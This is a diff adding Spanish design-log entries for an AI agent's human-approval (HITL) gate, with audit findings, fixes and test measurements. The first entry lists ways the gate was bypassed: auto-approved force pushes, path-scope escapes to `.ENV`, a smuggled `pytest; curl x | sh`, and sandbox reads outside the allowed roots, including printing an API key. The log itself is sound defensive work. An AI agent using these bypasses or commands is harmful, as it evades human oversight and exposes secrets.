@@ -4542,3 +4542,45 @@ Los dos últimos ítems quedaron construidos y verificados:
 Tests sin red (mocks de `requests.post` + `http.server` fake), diseño en
 la sección "Vision/PDF y A2A" de design.md.
 
+
+
+## H1 — el pedido HITL como dato (2026-10-26)
+
+**Problema medido** (auditoría 2026-10-26): con `plan_respuesta` del conductor, `¿Seguro? (1/2) (s/n):` de `git push --force` → `s`; `/repo/docs_evil/x` con scope `/repo/docs` → `s`; `/repo/.ENV` → `s`; `pytest; curl x | sh` con prefijo `pytest` → `s`. En sandbox, `auto` leyó fuera de las raíces con `cd ..;cat`, `cat d/*` (symlink) y `echo $DEEPSEEK_API_KEY`, y `sort -uo/tmp/x` escribió fuera.
+
+**Cambio**: el pedido viaja como `Pedido` y el aprobador decide sobre sus campos; banco y conductor dejan de parsear prompts (`HITL_SCOPE`). Un `(s/n)` que no pasó por `pedir_aprobacion` se rechaza.
+
+**Medición**: de los 22 casos de `tests/test_auditoria_2026_10_26.py` que corren sobre el código previo, 17 fallan antes y pasan después; los 5 restantes son controles de no-regresión de fricción (lecturas legítimas que siguen `auto`). Suite completa: 1000 passed, 13 skipped. Ratchet: `tests_definidos` 969 → 997; las otras 7 métricas, iguales.
+
+**Pendiente de medir**: los escenarios del banco con LLM real (fricción HITL y turnos OK con el aprobador por scope); no se corrieron en esta sesión (sin API key).
+
+
+## H1b — cierre de H1 y gate de H2 (2026-10-26)
+
+**Origen**: la auditoría de H1 con LLM real (4 corridas, ~$0,007) validó aprobación y rechazo por scope y dejó 5 observaciones. Se cierran las que eran fallas: el conductor sin `--permitir-comandos` fallaba ABIERTO; `prod.env` pasaba la denylist; y el banco no medía tarea hecha (`exp2-docs` dio 2/2 OK con el modelo negándose, con razón: la spec ya estaba aplicada).
+
+**Cambios**: conductor con `comandos=[]`; denylist por sufijo; `alcance_amplio` acotado a las raíces (medido: `revisá /usr y /etc` 2,0 s → 0,0 s); `VerificarCitas` como nodo (F6: sale la llamada LLM de `post` y dos `except Exception`); `verificar:` en el banco con 5 chequeos deterministas (`existe`, `no_existe`, `contiene`, `transcript`, `comando`) en `smoke`, `banco-1` y `banco-3`; `exp2-docs` retirado.
+
+**Gate de H2**: `tests/test_caracterizacion_chat.py` corre el grafo completo con LLM guionado y afirma solo lo observable (presupuesto, L8, no-progreso, DSML, sanitizado, citas, compactación, checkpoint). No toca nodos ni claves privadas: el kernel de H2 tiene que pasarlo sin cambiar una línea.
+
+**Medición**: los 10 casos de cierre (7 tests con parametrize) fallan sobre H1 y pasan con H1b; los 12 de caracterización pasan en los dos (describen lo que el chat ya hacía). Ver el reporte para suite y ratchet.
+
+**Pendiente con LLM real**: `smoke.yaml` y `banco-1-marcadores.yaml` con `verificar:` (primera medición de tarea hecha) y la fricción de `auto` en sesión larga.
+
+
+## H1d — un escenario que mide la fricción de `auto` (2026-10-26)
+
+**Problema**: `banco-1` y `banco-3` daban OK sin trabajar (fixes ya aplicados; `pytest` pasaba igual). Era el escenario elegido para medir la fricción de H1: no medía nada.
+
+**Cambio**: retirados; regla `CHEQUEOS_DE_TRABAJO` (todo `verificar:` necesita un chequeo que un turno vacío no cumple, validada al cargar y por test sobre todos los escenarios); chequeo `salida` (la respuesta correcta la calcula un comando contra el repo vivo); `friccion-auto` con 6 tareas de lectura (grep, glob, wc, pytest, búsqueda de definición) y el resumen suma HITL pedidos.
+
+**Pendiente con LLM real**: correr `friccion-auto` y anotar tareas hechas / HITL pedidos. Antes de H1 cada turno pedía 0 HITL; esa es la línea de base.
+
+
+## H1e — la suite no hereda el aprobador del chat (2026-10-26)
+
+**Primera medición de `friccion-auto` con LLM real** (auditoría del operador): 5/6 tareas de lectura hechas; **fricción nueva de H1: 2 HITL en 6 tareas**, exactamente los dos turnos de glob (`modules/*.py`, `skills/*.yaml`); grep, wc, find con comillas y pytest siguen `auto`. Línea de base previa a H1: 0.
+
+**El `no-hecha` de `correr-tests` era del entorno, no del modelo**: pytest corrido dentro del chat heredaba `HITL_SCOPE` y `por_scope` contestaba los HITL de los tests (24 passed + 2 failed adentro, 26 afuera). El modelo lo detectó y explicó la discrepancia. También en `banco-1`: un `mkdir no_se_debe_crear` aprobado por scope.
+
+**Cambio**: fixture autouse en `conftest.py` que limpia `HITL_SCOPE` y fija `HITL_WEB=0`. Reproducido sin LLM: con `HITL_SCOPE` en el entorno, `test_policy.py`+`test_hitl.py` daban 3 failed y dejaban el residuo; con el fixture, 49 passed y sin residuo. Esperado en la próxima corrida: `friccion-auto` 7/7.
